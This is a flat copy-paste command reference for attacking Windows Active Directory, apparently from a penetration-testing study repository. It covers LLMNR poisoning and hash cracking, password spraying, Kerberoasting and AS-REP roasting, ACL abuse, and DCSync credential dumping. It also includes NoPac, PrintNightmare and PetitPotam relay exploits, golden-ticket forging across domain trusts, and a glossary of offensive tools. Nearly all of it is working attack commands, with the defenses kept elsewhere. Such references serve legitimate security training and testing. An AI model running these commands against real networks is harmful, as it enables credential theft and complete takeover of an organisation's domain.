# Active Directory — Command Quick Reference

Flat copy-paste reference for the full AD attack chain. **Explanations, detection Event IDs, and defenses are in `13-active-directory/README.md`** — this is just the commands. Placeholders: `<DC>`, `<DOMAIN>`, `<u>`, `<p>`, `<iface>`.

## Initial enumeration (foothold on the network)
```bash
sudo responder -I <iface> -A                 # ANALYZE (passive) first
sudo responder -I <iface> -wrf               # then poison
hashcat -m 5600 ntlmv2.hash rockyou.txt      # crack captured NetNTLMv2
fping -asgq 172.16.5.0/23                     # host sweep
sudo nmap -v -A -iL hosts.txt -oN host-enum
kerbrute userenum -d <DOMAIN> --dc <DC> users.txt -o valid_users
```
Windows LLMNR poisoning: `Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y` / `.\Inveigh.exe`

## Password policy + user list + spray
```bash
crackmapexec smb <DC> -u <u> -p <p> --pass-pol
rpcclient -U "" -N <DC>                       # querydominfo ; enumdomusers
enum4linux-ng -P <DC> -oA out ; enum4linux -U <DC>
ldapsearch -h <DC> -x -b "DC=..,DC=.." "(objectclass=user)" | grep sAMAccountName
./windapsearch.py --dc-ip <DC> -u "" -U
# spray (mind lockout):
kerbrute passwordspray -d <DOMAIN> --dc <DC> valid_users.txt Welcome1
crackmapexec smb <DC> -u valid_users.txt -p Password123 | grep +
crackmapexec smb --local-auth <range> -u administrator -H <hash> | grep +   # local admin reuse
```
Windows: `Get-DomainPolicy` / `net accounts` ; `Invoke-DomainPasswordSpray -Password Welcome1`

## Credentialed enumeration
```bash
crackmapexec smb <DC> -u <u> -p <p> --users --groups --loggedon-users --shares
crackmapexec smb <DC> -u <u> -p <p> -M spider_plus --share <share>
smbmap -u <u> -p <p> -d <DOMAIN> -H <DC> -R SYSVOL --dir-only
psexec.py <DOMAIN>/<u>:'<p>'@<host> ; wmiexec.py <DOMAIN>/<u>:'<p>'@<host>
sudo bloodhound-python -u <u> -p <p> -ns <DC> -d <DOMAIN> -c all
```
Windows security-control checks: `Get-MpComputerStatus` ; `Get-AppLockerPolicy -Effective` ; `$ExecutionContext.SessionState.LanguageMode` ; LAPSToolkit `Find-LAPSDelegatedGroups` ; Snaffler `-d <DOMAIN> -s -v data`

## Kerberoasting / AS-REP
```bash
GetUserSPNs.py -dc-ip <DC> <DOMAIN>/<u> -request -outputfile tgs.hash
hashcat -m 13100 tgs.hash rockyou.txt
GetNPUsers.py <DOMAIN>/ -dc-ip <DC> -no-pass -usersfile users.txt -format hashcat
hashcat -m 18200 asrep.hash rockyou.txt
```
Windows: `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap` ; `.\Rubeus.exe asreproast /user:<u> /nowrap /format:hashcat`

## ACL abuse
```powershell
Find-InterestingDomainAcl -ResolveGUIDs
$sid = Convert-NameToSid <u>; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
Set-DomainUserPassword -Identity <target> -AccountPassword $pw -Credential $Cred     # ForceChangePassword
Add-DomainGroupMember -Identity '<group>' -Members <me> -Credential $Cred            # AddMember
Set-DomainObject -Identity <u> -SET @{serviceprincipalname='x/y'} -Credential $Cred  # GenericWrite → kerberoast
```

## DCSync
```bash
secretsdump.py -just-dc INLANEFREIGHT/<u>@<DC>            # all hashes
secretsdump.py -just-dc-user <DOMAIN>/administrator <u>@<DC>
```
Windows: `mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\administrator`

## Bleeding-edge CVEs
```bash
# NoPac
python3 scanner.py <DOMAIN>/<u>:<p> -dc-ip <DC> -use-ldap
python3 noPac.py <DOMAIN>/<u>:<p> -dc-ip <DC> -dc-host <DCNAME> -shell --impersonate administrator -use-ldap
# PrintNightmare (CVE-2021-1675) — DLL via SMB (payload not stored)
rpcdump.py @<DC> | egrep 'MS-RPRN|MS-PAR'
# PetitPotam → AD CS relay → DCSync
sudo ntlmrelayx.py -smb2support --target http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController
python3 PetitPotam.py <ME> <DC>
```

## Misc misconfigs
```bash
gpp-decrypt <cpassword> ; crackmapexec smb <DC> -u <u> -p <p> -M gpp_autologin
adidnsdump -u <DOMAIN>\\<u> ldap://<DC> -r
# PowerView: Get-DomainUser * | select samaccountname,description ; Get-DomainUser -UACFilter PASSWD_NOTREQD
```

## Trusts (child→parent ExtraSIDs)
```bash
secretsdump.py <child>/<adm>@<child-dc> -just-dc-user <CHILD>/krbtgt
lookupsid.py <child>/<adm>@<child-dc> | grep "Domain SID"
lookupsid.py <child>/<adm>@<parent-dc> | grep -B12 "Enterprise Admins"
ticketer.py -nthash <krbtgt> -domain <CHILD> -domain-sid <CHILD_SID> -extra-sid <PARENT_EA_SID> hacker
export KRB5CCNAME=hacker.ccache
psexec.py <CHILD>/hacker@<parent-dc> -k -no-pass -target-ip <parent-dc-ip>
raiseChild.py -target-exec <parent-dc-ip> <CHILD>/<adm>        # automated
```
Windows golden ticket: `mimikatz # kerberos::golden /user:hacker /domain:<CHILD> /sid:<CHILD_SID> /krbtgt:<hash> /sids:<PARENT_EA_SID> /ptt`

## Tools glossary (what each is for)
**Enumeration / situational awareness**
- **PowerView / SharpView** — PS/.NET AD recon, net* replacement, finds quick wins (Kerberoast/ASREP).
- **BloodHound** + **SharpHound** (C#) / **BloodHound.py** (ingestors) — graph AD relationships → attack paths.
- **rpcclient / enum4linux(-ng) / ldapsearch / windapsearch / smbmap** — Linux AD/SMB/LDAP enum.
- **Snaffler** — hunt creds/secrets in file shares. **adidnsdump** — dump DNS records over LDAP.
- **AD Explorer** (snapshot/compare) · **PingCastle** (risk score) · **Group3r** (GPO audit) · **ADRecon** (full dump to Excel).

**Poisoning / spraying**
- **Responder** (Linux) / **Inveigh / InveighZero** (Windows) — LLMNR/NBT-NS/MDNS poisoning.
- **Kerbrute** — Kerberos user enum + spray. **DomainPasswordSpray.ps1** — Windows spray. **CrackMapExec** — enum + spray + exec (SMB/WMI/WinRM/MSSQL).
- **LAPSToolkit** — audit/attack LAPS.

**Kerberos / creds**
- **Rubeus** (C# Kerberos abuse) · **GetUserSPNs.py** (Kerberoast) · **GetNPUsers.py** (AS-REP) · **setspn.exe** (SPN enum).
- **Mimikatz** — PtH, plaintext creds, ticket extraction, DCSync, golden ticket. **Hashcat** — crack.
- **secretsdump.py** — dump SAM/LSA/NTDS. **ticketer.py** (forge tickets) · **lookupsid.py** (SID brute) · **gettgtpkinit.py / getnthash.py** (cert→TGT→hash).

**Execution / lateral**
- **psexec.py / wmiexec.py** (Impacket shells) · **evil-winrm** (WinRM shell) · **mssqlclient.py** (MSSQL) · **smbserver.py** (file host).

**Exploits**
- **noPac.py** (CVE-2021-42278/42287) · **CVE-2021-1675.py** (PrintNightmare) · **PetitPotam.py** (CVE-2021-36942) · **ntlmrelayx.py** (NTLM relay) · **raiseChild.py** (child→parent auto) · **rpcdump.py** (RPC endpoint map).
